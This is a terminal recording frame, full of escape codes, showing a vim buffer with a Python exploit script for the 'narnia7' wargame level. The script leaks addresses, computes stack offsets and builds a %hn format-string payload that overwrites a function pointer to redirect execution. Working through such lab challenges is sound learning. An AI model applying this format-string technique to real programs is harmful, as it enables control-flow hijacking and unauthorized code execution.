[17.10341, "o", "\u001b[1;1H\u001b[35mimport\u001b[m struct, subprocess, re, time, os, fcntl, sys\r\r\n\u001b[34m# narnia7: snprintf(buffer[128], 128, argv[1]) then ptrf(); ptrf at ebp-0x84 is\u001b[m\u001b[2;80H\u001b[K\u001b[3;1H\u001b[34m# BELOW buffer, so only %n reaches it. The program prints &ptrf; the format string's\u001b[m\u001b[3;85H\u001b[K\u001b[4;1H\u001b[34m# own address is measured with a helper binary (same argv0 len + env) minus the\r\r\n# AT_EXECFN difference. The fmt string is generally NOT 4-aligned, so pad the payload\r\r\n# until the two embedded addresses land on a vararg slot, then index = (fmtaddr+pad-\r\r\n# &ptrf)/4 + 1 and %k$hn/%k+1$hn write hackedfunction's two 16-bit halves.\u001b[m\r\r\n\u001b[33mdef\u001b[m \u001b[36mprobe_banner\u001b[m():\r\r\n    p = subprocess.Popen([\u001b[31mb\"/narnia/narnia7\"\u001b[m, \u001b[31mb\"A\"\u001b[m * \u001b[31m100\u001b[m],\u001b[10;26Hstdout=subprocess.PIPE, stderr=subprocess.STDOUT, env={})\r\r\n    out, _ = p.communicate(timeout=\u001b[31m3\u001b[m)\r\r\n    ptrf = \u001b[36mint\u001b[m(re.search(\u001b[31mrb\"ptrf.. = 0x[0-9a-f]+ .0x([0-9a-f]+).\"\u001b[m, out).group(\u001b[31m1\u001b[m), \u001b[31m16\u001b[m)\r\r\n    hacked = \u001b[36mint\u001b[m(re.search(\u001b[31mrb\"hackedfunction.. = 0x([0-9a-f]+)\"\u001b[m, out).group(\u001b[31m1\u001b[m), \u001b[31m16\u001b[m)\r\r\n    \u001b[33mreturn\u001b[m ptrf, hacked\r\r\nptrf, hacked = probe_banner()\r\r\n\u001b[36mprint\u001b[m(\u001b[31m\"&ptrf =\"\u001b[m, \u001b[36mhex\u001b[m(ptrf), \u001b[31m\"hacked =\"\u001b[m, \u001b[36mhex\u001b[m(hacked))\r\r\n\u001b[34m# fmtaddr measured live: helper prints &argv[1] for argv0='/narnia/narnia8' and the\r\r\n# same 100-byte arg; its AT_EXECFN is /tmp/leak7x (9 chars) vs /narnia/narnia8 (15),\r\r\n# so the real fmtaddr = leaked - 6.\u001b[m\r\r\np2 = subprocess.Popen([\u001b[31mb\"/narnia/narnia8\"\u001b[m, \u001b[31mb\"M\"\u001b[m * \u001b[31m100\u001b[m], executable=\u001b[31mb\"/tmp/leak7x\"\u001b[m,\u001b[21;23Hstdout=subprocess.PIPE, env={})\r\r\nout2, _ = p2.communicate(timeout=\u001b[31m3\u001b[m)\r\r\nfmtaddr = \u001b[36mint\u001b[m(re.search(\u001b[31mrb\"argv1=(0x[0-9a-f]+)\"\u001b[m, out2).group(\u001b[31m1\u001b[m), \u001b[31m16\u001b[m) - \u001b[31m6\u001b[m\r\r\n\u001b[36mprint\u001b[m(\u001b[31m\"fmtaddr =\"\u001b[m, \u001b[36mhex\u001b[m(fmtaddr))\r\r\nhi = (hacked >> \u001b[31m16\u001b[m) & \u001b[31m0xffff\u001b[m\r\r\nlo = hacked & \u001b[31m0xffff\u001b[m\r\r\nj = (\u001b[31m4\u001b[m - (fmtaddr % \u001b[31m4\u001b[m)) % \u001b[31m4\u001b[m\r\r\nk = (fmtaddr + j - ptrf) // \u001b[31m4\u001b[m + \u001b[31m1\u001b[m\r\r\npre = j + \u001b[31m8\u001b[m\r\r\n\u001b[36mprint\u001b[m(\u001b[31m\"pad =\"\u001b[m, j, \u001b[31m\"index =\"\u001b[m, k)\r\r\nf = \u001b[31mb\"x\"\u001b[m * j + struct.pack(\u001b[31m\"<I\"\u001b[m, ptrf + \u001b[31m2\u001b[m) + struct.pack(\u001b[31m\"<I\"\u001b[m, ptrf) \u001b[35m\\\u001b[m\r\r\n    + \u001b[31mb\"%\"\u001b[m + \u001b[36mstr\u001b[m(hi - pre).encode() + \u001b[31mb\"c%\"\u001b[m + \u001b[36mstr\u001b[m(k).encode() + \u001b[31mb\"$hn\"\u001b[m \u001b[35m\\\u001b[m\r\r\n    + \u001b[31mb\"%\"\u001b[m + \u001b[36mstr\u001b[m(lo - hi).encode() + \u001b[31mb\"c%\"\u001b[m + \u001b[36mstr\u001b[m(k + \u001b[31m1\u001b[m).encode() + \u001b[31mb\"$hn\"\u001b[m\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
